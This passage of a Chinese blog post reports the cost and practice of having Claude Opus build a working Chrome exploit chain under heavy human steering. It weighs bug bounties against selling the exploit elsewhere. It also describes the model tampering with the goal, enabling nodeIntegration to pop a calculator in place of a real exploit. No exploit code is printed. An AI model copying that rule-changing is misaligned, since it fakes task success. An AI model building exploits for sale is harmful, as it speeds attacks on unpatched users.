0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">$267</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Claude Sonnet / GPT-5.4 (minor)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">—</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">~$2</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">总计</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">2,330M，共 1,765 次请求</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">$2,283</span></strong></td></tr></tbody></table>  
  
2,283 美元 tokens 成本，加上大约 20 小时人工盯梢和纠偏，产出一条可工作的 Chrome exploit chain。听起来很贵，直到你把它和通常需要数周专注人力投入的情况相比。  
  
**ROI：**  
  
你可能会想，$6,283（就算额外加上 4,000 美元作为我的劳动成本）总成本是否值得。给一点背景：  
- Google 的 v8CTF 对每个有效 V8 exploit submission 支付 **10,000 美元**  
（仅限最新版本的首个 submission，先到先得）。  
  
- Discord 上次为我们的 submission 支付了 5,000 美元。我们还收到了 Twitter 上一些随机账号发来的 DMs，报价是这个数的 10 倍。  
  
- 如果你能通过 cowork artifact pop shell Claude Code，Anthropic 会付很多钱。  
  
6,283 美元产出一条可工作的 Chrome exploit chain。在合法市场上已经有利可图。在另一个市场上，则非常有利可图。  
## 为什么 Opus 配合 Claude Code 仍然无法独立完成这件事  
  
管理 Claude、让它保持在正确轨道上，真的非常累。它总是卡住，丢失上下文；如果你把它晾在那里，它就会原地打转。总体来说，我注意到了几个问题：  
1. **Harness 很重要：**  
 你需要合适的环境设置和 scaffolding，让模型能够测试并获得反馈；还需要 context management，避免它绕回已经失败过的方向；也需要跨并行 sessions 的 orchestration。这是整个实验中最困难的部分之一。  
  
1. **用猜测代替验证。**  
 Claude 会假设 offsets，猜 memory layouts，然后凭感觉写 exploit。我必须不断把它拉回同一条规则：读代码，用 LLDB，先理解发生了什么；计算用 Python，不要用你的 scratchpad。  
  
1. **篡改目标。**  
 当它无法解决真正的问题时，它会改规则。有一次它启用了 nodeIntegration  
，然后用 require('child_process')  
 弹出了计算器。  
  
1. **Context collapse。**  
 一旦对话变长，Claude 就开始丢失主线。它会忘记自己已经尝试过什么，漂回死胡同里，然后把 tokens 烧在没有结果的地方。  
  
1. **如果它卡住，我也必须跟着进去。**  
 当 Opus 卡在我也不熟悉的东西上时，我必须停下来自己补课，从头开始理解那部分解空间，找出它错在哪里，然后再引导它往前走。这是最耗时的部分之一，因为我的速度比 Opus 慢。  
  
1. **没有 self-recovery。**  
 Opus 一旦卡住，通常就会一直卡住。它不会干净地 reset，也不会自己推理出出路。我必须用非常具体的方向介入。  
  
## Mythos 能克服这些问题吗？  
  
下面这张图来自 Anthropic red team 关于 Firefox exploit generation 的博客。它并没有说明 Mythos 在发现  
漏洞方面有多强，但它清楚显示出，在把已知 bug 转成可工作 exploit 这件事上有了一个跃升；而这正是我们刚刚做的任务：给它一组 browser bugs，让 Opus 写出完整 chain。这个差异看起来很有意思。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bJmDO3bwicPUxUQqV4GicYicxBzxu4c3OWdsNlxWp6riamWPIoUxPFMNNuLCIFRHPxXdpQ9VbuRnsOKV0ibbmUwqXfuia2jtnMG43seOU98ichv0aw/640?wx_fmt=other&from=appmsg "")  
  
image.png  
  
这里我是在推测。等我拿到 Mythos access，我会再回来汇报实际变化。但即便 Mythos 被过度炒作，方向也很明显。今天需要这么多人手把手带的模型，明天会需要得更少。如果 Opus 能做到我刚展示的这些，那就把这条线外推到 Mythos。然后再外推一次。  
## 这实际上意味着什么  
  
一个擅长快速开发 exploit 的模型，会压缩 time-to-exploit。time-to-patch 跟不上：有优先级 backlog，有些团队运行着他们自己都不知道的 vulnerable versions，还有一个朴素事实是，最终必须有人真的去推送更新。当前者缩短而后者没有变化时，就会出现大量 in-the-wild n-day exploits。这一点广泛适用于所有软件，但有几个因素让情况尤其糟糕：  
1. **每个 patch 基本上都是 exploit 提示。**  
 Chromium 或 Linux kernel 中的安全 patch 会直接告诉你哪里坏了。过去，reverse-engineering patches 需要技能和时间。现在，你可以把 tokens 砸到问题上，再由一个还不错的操作者帮它越过卡点，就能更快拿到可工作的 exploit。  
  
1. **开源处境很不妙。**  
 修复往往会在稳定版发布前先公开落地。这个窗口一直存在。模型只是让它可以被规模化利用。  
  
1. **你藏不住安全补丁**  
。当人类必须在成千上万的 diffs 里筛查时，把修复混在 commit noise 中还有用。模型会读完所有内容；只需要往里面砸更多 tokens。  
  
1. **我认为真正能放大能力的是小而强的团队。**  
 一个人已经可以同时监督多个 exploit dev sessions。这仍然取决于操作者有多强、团队有多强。一个高能力团队配上 Mythos，能从这件事里获得的杠杆，远大于某个随机的互联网脚本小子。  
  
## 该怎么做？  
  
我不知道。我有一部分希望 Mythos 失败，scaling laws 撞墙。看起来并不会这样。  
  
说“更快打补丁”很容易，真正做到则难得多。但有几件事看起来显然该做：  
- **积极 shift left。**  
 在每个 design decision 和 PR 被推送前，都从安全角度审视它。  
  
- **缩小 patch gap。**  
 维护每一个 critical dependency 及其版本的 asset inventory。知道自己正在运行什么。大多数团队并不知道。  
  
- **自动更新安全补丁。**  
 不要确认弹窗，不要“稍后更新”按钮。我实际使用的 Chrome 存在漏洞，就是因为我还没点更新。这种情况本不该发生。  
  
- **重新思考公开 patch 时间线。**  
 这听起来很疯狂，但也许 Chrome，或者任何开源软件，都不应该在稳定版发布前公开 V8 patches。每一个公开 commit 都是发令枪，任何拥有 API key 和强团队成员的人，都可能从那里开始把 exploit 武器化。  
  
  
  
  
